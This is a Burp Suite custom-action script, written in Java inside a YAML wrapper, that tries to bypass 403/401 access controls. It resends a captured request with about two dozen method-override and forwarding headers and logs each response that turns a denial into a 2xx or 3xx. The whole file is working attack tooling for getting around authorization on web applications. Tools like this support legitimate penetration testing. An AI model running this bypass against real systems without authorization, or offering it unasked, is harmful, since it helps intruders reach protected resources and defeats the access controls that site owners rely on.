id: b089c2e1-45f8-4b7b-9c6d-bypass-method-001
name: 403/401 Bypass - Method Override Headers
function: CUSTOM_ACTION
location: REPEATER
source: |+
  // 403/401 Bypass - Method Override Headers
  // Tests bypass using X-HTTP-Method-Override and similar headers
  
  int DELAY_MS = 50;
  boolean VERBOSE = true;
  
  String[][] METHOD_OVERRIDE_HEADERS = {
      {"X-HTTP-Method-Override", "GET"},
      {"X-HTTP-Method-Override", "POST"},
      {"X-HTTP-Method-Override", "PUT"},
      {"X-HTTP-Method-Override", "DELETE"},
      {"X-HTTP-Method-Override", "PATCH"},
      {"X-HTTP-Method", "GET"},
      {"X-HTTP-Method", "POST"},
      {"X-HTTP-Method", "PUT"},
      {"X-Method-Override", "GET"},
      {"X-Method-Override", "POST"},
      {"X-Method-Override", "PUT"},
      {"X-Requested-With", "XMLHttpRequest"},
      {"X-Do-Not-Track", "1"},
      {"Max-Forwards", "0"},
      {"Max-Forwards", "1"},
      {"Max-Forwards", "2"},
      {"Proxy-Connection", "keep-alive"},
      {"X-Forwarded-Port", "443"},
      {"X-Forwarded-Port", "80"},
      {"X-Forwarded-Port", "8080"},
      {"X-Forwarded-Port", "8443"},
      {"X-Forwarded-Proto", "https"},
      {"X-Forwarded-Proto", "http"},
      {"X-Forwarded-Scheme", "https"},
      {"X-Forwarded-Scheme", "http"},
      {"X-Forwarded-Ssl", "on"},
      {"X-Forwarded-Ssl", "off"}
  };
  
  var originalRequest = requestResponse.request();
  var httpService = requestResponse.httpService();
  int originalStatus = requestResponse.response().statusCode();
  
  logging.logToOutput("=== 403/401 Bypass - Method Override Headers ===");
  logging.logToOutput("Target: " + httpService.host() + originalRequest.path());
  logging.logToOutput("Original Status: " + originalStatus);
  logging.logToOutput("");
  
  int total = 0, success = 0;
  
  java.util.function.BiPredicate<Integer, Integer> isSuccess = (orig, curr) -> 
      (curr >= 200 && curr < 400) && (orig == 401 || orig == 403);
  
  for (String[] headerPair : METHOD_OVERRIDE_HEADERS) {
      try {
          var req = originalRequest.withHeader(headerPair[0], headerPair[1]);
          var resp = api.http().sendRequest(req);
          Thread.sleep(DELAY_MS);
          
          int status = resp.response().statusCode();
          String note = headerPair[0] + ": " + headerPair[1] + " -> " + status;
          
          if (isSuccess.test(originalStatus, status)) {
              success++;
              logging.logToOutput("[+] SUCCESS: " + note);
              var rr = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(req, resp.response());
              rr.annotations().setNotes("Method Override Bypass: " + note);
              api.organizer().sendToOrganizer(rr);
          } else if (VERBOSE) {
              logging.logToOutput("[-] " + note);
          }
          total++;
      } catch (Exception e) {
          logging.logToError("Error: " + e.getMessage());
      }
  }
  
  logging.logToOutput("");
  logging.logToOutput("=== Complete: " + total + " requests, " + success + " bypasses ===");
